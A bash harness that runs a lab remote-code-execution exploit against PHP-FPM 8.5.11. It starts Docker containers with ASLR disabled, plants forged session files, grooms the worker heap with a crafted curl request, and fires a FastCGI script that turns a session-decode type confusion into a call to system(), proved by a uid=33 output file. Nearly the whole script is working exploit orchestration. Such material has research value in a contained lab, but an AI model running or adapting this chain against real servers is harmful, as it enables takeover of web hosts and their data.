#!/usr/bin/env bash
# PHP-FPM 8.5.11 RCE (lab): upload-progress + session decode type-confusion ->
# pDestructor=zif_system with a forged execute_data. Proof: uid=33(www-data).
# MODE=nogdb (default): no debugger, only setarch -R (ASLR off).
# MODE=gdb: same chain under the tracing probe.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
NAME=${FPM_NAME:-p2s-fpm-rce}
NET=${NET:-p2s-fpm-net}
NGINX=${NGINX:-p2s-nginx-8511}
NGINX_PORT=${NGINX_PORT:-9002}
FCGI_PORT=${FCGI_PORT:-9003}
IMAGE=${IMAGE:-p2s-fpm-gdb:8511}
PROOF=${PROOF:-/tmp/fpmx_proof}
FILL=${FILL:-fillU.bin}
SESS=${SESS:-sess_T}
B_PAGE=${B_PAGE:-/index.php}
MODE=${MODE:-nogdb}
PROBE=${PROBE:-probe-rce.gdb}

if ! docker network inspect "$NET" >/dev/null 2>&1; then
    docker network create "$NET" >/dev/null
fi
if ! docker inspect "$NGINX" >/dev/null 2>&1; then
    echo "missing nginx container $NGINX" >&2
    exit 1
fi
docker start "$NGINX" >/dev/null 2>&1 || true

docker rm -f "$NAME" >/dev/null 2>&1 || true
docker rm -f p2s-fpm-8511 >/dev/null 2>&1 || true
if [ "$MODE" = gdb ]; then
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-8511 --security-opt seccomp=unconfined \
        -p 127.0.0.1:"$FCGI_PORT":9000 \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/zz-single.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
        -v "$HERE/$PROBE:/tmp/$PROBE:ro" \
        -v "$HERE/payload/$FILL:/tmp/fillU.bin:ro" \
        "$IMAGE" setarch -R gdb -q -batch -x /tmp/$PROBE \
        --args /usr/local/sbin/php-fpm -F >/dev/null
else
    docker run -d --name "$NAME" --network "$NET" --network-alias p2s-fpm-8511 --security-opt seccomp=unconfined \
        -p 127.0.0.1:"$FCGI_PORT":9000 \
        -v "$ROOT/www:/var/www/html:ro" \
        -v "$HERE/zz-single.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
        -v "$HERE/payload/$FILL:/tmp/fillU.bin:ro" \
        "$IMAGE" setarch -R /usr/local/sbin/php-fpm -F >/dev/null
fi
sleep 1.7
docker restart "$NGINX" >/dev/null 2>&1 || true
sleep 0.6

A=11111111111111111111111111111111
B=33333333333333333333333333333333
docker cp "$HERE/payload/sess_A" "$NAME:/tmp/sess_$A" >/dev/null
docker cp "$HERE/payload/$SESS" "$NAME:/tmp/sess_$B" >/dev/null
docker exec "$NAME" chown 33:33 "/tmp/sess_$A" "/tmp/sess_$B"
docker exec "$NAME" rm -f "$PROOF"

# A: groom the worker heap (single worker, pm.max_children=1)
curl -s -o /dev/null -b "PHPSESSID=$A" \
    "http://127.0.0.1:$NGINX_PORT/fpm_sess_split2.php?pre=24576&pad=1490900&hole=4096"
# B: reclaim the freed chunk, decode the forged session, trigger the destructor
python3 "$HERE/fcgi_split.py" "$FCGI_PORT" "$B" feffffffffffffff 0 0 0 0 0 \
    "/var/www/html${B_PAGE}" /tmp/leak.bin 12000 150 8170 "$HERE/payload/$FILL" 2>/dev/null || true
sleep 1.2

if docker cp "$NAME:$PROOF" /tmp/fpm-proof.out >/dev/null 2>&1; then
    echo "RCE proof ($PROOF):"
    cat /tmp/fpm-proof.out
else
    echo "no proof file; last probe lines:" >&2
    docker cp "$NAME:/tmp/fpm-split3.log" /tmp/fpm-sweep.log >/dev/null 2>&1 || true
    grep -E 'ZIFCALL|POPEN|SIGSEGV|SIGABRT' /tmp/fpm-sweep.log 2>/dev/null | tail -5 >&2 || true
    exit 1
fi
